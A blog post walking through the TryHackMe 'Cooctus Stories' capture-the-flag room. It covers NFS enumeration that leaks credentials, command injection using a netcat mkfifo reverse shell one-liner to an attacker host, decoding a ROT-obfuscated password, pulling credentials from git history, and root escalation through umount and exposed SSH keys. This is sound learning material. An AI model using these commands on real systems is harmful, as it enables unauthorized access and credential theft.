---
layout: post
title: "Cooctus Stories | THM "
date: 2021-12-19 17:17:00 -0000
categories: CTF THM
---

Cooctus Stories | THM 
12 - 19 - 21 

10.10.118.63

<h2> nmap </h2> 
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
8080/tcp open  http-proxy
35521/tcp open  nlockmgr 1-4 (RPC #100021)
47325/tcp open  mountd   1-3 (RPC #100005)
53991/tcp open  mountd   1-3 (RPC #100005)
58267/tcp open  mountd   1-3 (RPC #100005)

<h2> Web </h2>

gobuster 
/login 
/cat 

<h2> NFS </h2> 

Theres nfs running on the server so that means that there should be a share that is up and running. 

showmount -e 10.10.118.63
Export list for 10.10.118.63:
/var/nfs/general *

sudo mount -t nfs 10.10.118.63:/var/nfs/general /tmp/nfs -nolock
* if you get an error here, try rebooting your device 

theres a file called credentials.bak in the share and we have either a username or a password here. 
paradoxial.test
ShibaPretzel79

we have bypassed the login. 

<h2> Post Login </h2>

We have a form where we can post something and we need to escape it to read credentials or post a file.

Its a post method and returns your input in a body tag after submitting. 

ping seemed to work, so lets just keep trying reverse shell till we get one that works. 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f the classic works!  

So we are in now and can grab the first flag. Then, if we read the crontab, there is an interesting script running from the user szymex. 


#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)

As you can see here, there is a password encoded in the script and it looks like it is doing a ROT to it. As ord takes the numerical value and translates it into a character. When the script is adding numbers together it is just changing the position. If we fire up cyberchef, we can get that password quickly. 

<h2> Szymex </h2> 

If we read the note in tux's directory, it seems like there are a series of challenges we must beat to get his password. 

tuxling_1  
First challenge has a bunch of c code that has been set-up with define statements. There are only 3 we need, f96050ad61. Thats key 1 

tuxling_2  
We have to find this one first.  
find / -type d -name tuxling_2 2>/dev/null
/media/tuxling_2
gpg import and decrypt! - 6eaf62818d  

tuxling_3 
This one is just reading the note - 637b56db1552

all together - f96050ad616eaf62818d637b56db1552
tuxykitty

<h2> tux </h2>

We can run a command as varg through sudo -l. Its a python script so lets see what it can do.  It asks for a password to login. Hm we cant get any further.

If we look in his directory again we can find that there is a hidden git folder. We can read some of the comments through cat but not all. If we run git show - we get the entire log and we can see a hard coded user and pass 
varg:slowroastpork

<h2> root </h2> 

Varg is allowed to run (root) NOPASSWD: /bin/umount. So how do we exploit umount to get root? After reseraching and reading other writeups I found that you can list the mounts and then look for abnormal mounts. 

We find an abornmal mount at /opt/coocktusos. if we unmount it, theres a root flag! but its a fake.However, there are ssh keys we can exploit. Copy them over to the attacking machine and then ssh back in as root for the flag.txt

This was a great room that took me around 3 hours  to crack! Very grateful for the other writeups for helping me with the last root esc. 




